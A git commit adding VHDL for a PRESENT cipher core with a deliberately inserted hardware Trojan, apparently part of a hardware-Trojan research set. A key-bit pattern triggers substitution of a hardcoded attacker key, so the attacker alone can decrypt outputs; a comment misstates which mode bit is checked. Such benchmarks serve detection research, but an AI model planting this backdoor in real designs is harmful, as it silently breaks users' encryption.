88a6d991f68984bef794dd5a33e603c61d87fe0f
Zeosleus <zeosleus@protonmail.com>
2023-06-04 11:36:00 +0300

    Added Trojan 8: Trigger=specific bit pattern on the 4 Least Significant Bits of the input key and 80-bit version selected (i.e. mode_sel(0)=0), Payload=Replace input key with attacker predefined key

---
+++ rtl/PRESENT/04_present_Trojan8.vhd
@@ -0,0 +1,149 @@
+library ieee;
+use ieee.std_logic_1164.all;
+use ieee.numeric_std.all;
+
+-- Trojan 8: trigger = specific pattern on the 4 Least Significant Bits of the input key and 
+-- 80-bit version selected (i.e. mode_sel(0) = 0)
+-- payload = replace input key with attacker defined key -> all computed ciphertexts can only be
+-- decrypted by the attacker and all computed plaintexts are wrong compared to what the benign user expects.
+
+entity present_Trojan8 is
+        port (
+                clk      : in std_logic;
+                rst      : in std_logic;
+                ena      : in std_logic;
+
+                mode_sel : in std_logic_vector(1 downto 0);
+                key      : in std_logic_vector(127 downto 0);
+                data_in  : in std_logic_vector(63 downto 0);
+                data_out : out std_logic_vector(63 downto 0);
+                ready    : out std_logic
+        );
+end entity present_Trojan8;
+
+architecture rtl of present_Trojan8 is
+        signal  key_sched_out,
+                key_mem_out : std_logic_vector(63 downto 0);
+
+        signal  current_round,
+                mem_address : std_logic_vector(4 downto 0);
+
+        signal  enc_ena,
+                dec_ena : std_logic;
+
+        signal  mem_wr_ena : std_logic;
+
+        signal  ciphertext,
+                plaintext,
+                mux_out : std_logic_vector(63 downto 0);
+
+        signal  key_sched_ena,
+                out_ena,
+                load_ena        : std_logic;
+
+        signal  trojan_trig : std_logic;
+
+        constant TRIGGERING_PATTERN : std_logic_vector(3 downto 0) := b"1010";
+        constant PREDEFINED_KEY : std_logic_vector(127 downto 0) := x"0000_0000_0000_1234_DAAD_BCDE_FEFE_5454";
+
+        signal  trojan_key : std_logic_vector(127 downto 0); 
+begin
+        -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
+        -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
+        
+        trojan_trig <= '1' when (key(3 downto 0) = TRIGGERING_PATTERN and mode_sel(1) = '0') else '0';
+
+        trojan_key <= PREDEFINED_KEY when (trojan_trig = '1') else key;
+
+        control_unit : entity work.present_control_unit
+                port map(
+                        -- inputs
+                        clk      => clk,
+                        rst      => rst,
+                        ena      => ena,
+                        op_sel => mode_sel(0),
+
+                        round_counter_val => current_round,
+                        mem_addr          => mem_address,
+                        mem_wr_ena        => mem_wr_ena,
+
+                        enc_ena  => enc_ena,
+                        dec_ena  => dec_ena,
+                        load_ena => load_ena,
+
+                        key_sched_ena => key_sched_ena,
+                        out_ena       => out_ena,
+                        ready         => ready
+                );
+
+        key_sched : entity work.key_schedule_top
+                port map(
+                        clk               => clk,
+                        rst               => rst,
+                        ena               => key_sched_ena,
+                        mode              => mode_sel(1),
+                        input_key         => trojan_key,
+                        output_key        => key_sched_out,
+                        round_counter_val => current_round
+                );
+
+        round_key_mem : entity work.key_mem
+                port map(
+                        clk      => clk,
+                        addr     => mem_address,
+                        data_in  => key_sched_out,
+                        wr_ena   => mem_wr_ena,
+                        data_out => key_mem_out
+                );
+
+        enc_dp : entity work.present_enc
+                port map(
+                        clk        => clk,
+                        rst        => rst,
+                        ena        => enc_ena,
+                        load_ena   => load_ena,
+                        plaintext  => data_in,
+                        round_key  => key_mem_out,
+                        ciphertext => ciphertext
+                );
+
+        dec_dp : entity work.present_dec
+                port map(
+                        clk        => clk,
+                        rst        => rst,
+                        ena        => dec_ena,
+                        load_ena   => load_ena,
+                        ciphertext => data_in,
+                        round_key  => key_mem_out,
+                        plaintext  => plaintext
+                );
+
+        -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
+        -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
+        -- the output register's input.
+        out_mux : entity work.mux
+                generic map(
+                        DATA_WIDTH => 64
+                )
+                port map(
+                        input_A => ciphertext,
+                        input_B => plaintext,
+                        sel     => dec_ena,
+                        mux_out => mux_out
+                );
+
+        -- Coprocessor-global output register, in order to preserve the computed output data,
+        -- until new ones are available. This can be helpful when a device reading from
+        -- the coprocessor's output, reads with a rate less than the data output rate.
+        out_reg : entity work.reg
+                generic map(
+                        DATA_WIDTH => 64
+                )
+                port map(
+                        clk  => clk,
+                        ena  => out_ena,
+                        rst  => rst,
+                        din  => mux_out,
+                        dout => data_out
+                );                             
+end architecture;
